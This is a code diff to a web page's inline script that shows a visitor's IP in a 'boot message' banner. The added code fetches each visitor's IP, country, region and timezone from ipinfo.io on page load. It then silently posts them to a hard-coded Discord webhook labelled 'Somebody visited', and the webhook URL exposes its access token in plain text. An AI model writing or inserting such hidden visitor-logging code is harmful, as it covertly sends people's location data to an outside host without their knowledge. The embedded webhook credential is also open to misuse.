@@ -32,17 +32,51 @@
     </script>
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        function fetchIpAddress(callback) {
-          fetch("https://api.ipify.org?format=json")
+        const fetchIpAddress = (callback) => {
+          fetch("https://ipinfo.io/json")
             .then((response) => response.json())
-            .then((data) => callback(data.ip))
+            .then((data) => callback(data))
             .catch((error) => console.error("Error fetching IP:", error));
-        }
+        };
 
-        function updateBootMessage(ipAddress) {
+        const updateBootMessage = async (data) => {
           const bootMessageElement = document.getElementById("boot-message");
-          bootMessageElement.textContent = `[IP] ${ipAddress} has booted...`;
-        }
+          bootMessageElement.textContent = `[IP] ${data.ip} has booted...`;
+
+          await fetch(
+            "https://discord.com/api/webhooks/1261671412985368636/da5mTSOyYkZz1SdOPz7T-5Ye-fZ6lyigrvNgmsH0_EHR0mjZyt5Y_qXPlVX7q2vw5xsk",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                embeds: [
+                  {
+                    color: 7506394,
+                    description: "Somebody visited",
+                    fields: [
+                      {
+                        name: "from IP",
+                        value: data.ip,
+                      },
+                      {
+                        name: "from Country",
+                        value: data.country,
+                      },
+                      {
+                        name: "from Region",
+                        value: data.region,
+                      },
+                      {
+                        name: "From Timezone",
+                        value: data.timezone,
+                      },
+                    ],
+                  },
+                ],
+              }),
+            }
+          );
+        };
 
         fetchIpAddress(updateBootMessage);
       });
